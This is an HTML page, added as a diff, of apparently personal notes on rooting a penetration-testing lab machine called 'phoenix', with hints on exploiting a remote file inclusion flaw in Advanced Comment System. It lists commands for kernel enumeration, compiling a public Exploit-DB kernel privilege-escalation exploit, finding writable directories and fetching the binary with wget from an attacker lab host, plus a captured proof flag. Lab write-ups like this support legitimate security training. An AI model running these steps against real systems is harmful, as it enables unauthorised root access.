@@ -1,0 +1,54 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>privilege escalation</title>
+</head><body>uname -a shows kernel version<br/>
+kernel is vulnerable to this exploit: https://www.exploit-db.com/exploits/9545/<br/>
+<br/>
+downloaded code and compiled with command:<br/>
+gcc -Wall -o linux-sendpage 9545.c<br/>
+<br/>
+Trying to transfer to the file.<br/>
+<br/>
+ftp won't work. no route to host or can't write files<br/>
+phoenix doesn't know tftp<br/>
+can't powershell since it is linux<br/>
+tried creating a file with vi or nano but freezes<br/>
+<br/>
+followed this excellent guide for using the FIND command to find writeable directories:<br/>
+https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/<br/>
+find /-perm -222 -type d 2&gt;/dev/null<br/>
+<br/>
+was able to use wget inside /tmp:<br/>
+wget http://10.11.0.187/phoenix<br/>
+<br/>
+ended up not working--&gt; error while loading shared libraries: requires glibc 2.5 or later dynamic linker<br/>
+<br/>
+Solution: (no space between comma and --hash-style)<br/>
+gcc -m32 -Wl,--hash-style=both 9545.c -o phoenix <br/>
+<br/>
+<br/>
+<img src="image.png" /><br/>
+<br/>
+Proof:<br/>
+<img src="image 2.png" /><br/>
+<br/>
+cat proof.txt<br/>
+f56a325ef00d4553a4046b7eacc5d667<br/>
+<br/>
+<br/>
+I was stuck on this one for three days. I came out learning a lot more about Linux.<br/>
+<br/>
+- Used a popular enumeration tool which is covered in the videos/pdf to find something that "might be interesting."<br/>
+- Vulnerability I exploited is common and is covered in the videos/pdf. (RFI)<br/>
+- Looked at source code and noticed ACS. Googled to find out what ACS is... = Advanced Comment System. Googled for vulnerability. Found it and exploited RFI on its admin.php page.<br/>
+- I didn't use nc to send the shell to my Kali machine. You can use Linux's own shell with the right command that I found via Google.<br/>
+- With low-priv shell, used uname -a and found easily via Google an exploit which works.<br/>
+- Compile on Kali and use the correct gcc compile options found if you Google the error message. It's also on the forum.<br/>
+- Use this excellent guide to help "find" a place where you will be able to download the code from your Kali machine: https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/<br/>
+<br/>
+This was only my third box and took me probably around 16 hours or so. Felt dumb but kept at it. <br/>
+<br/>
+<br/>
+</body></html>
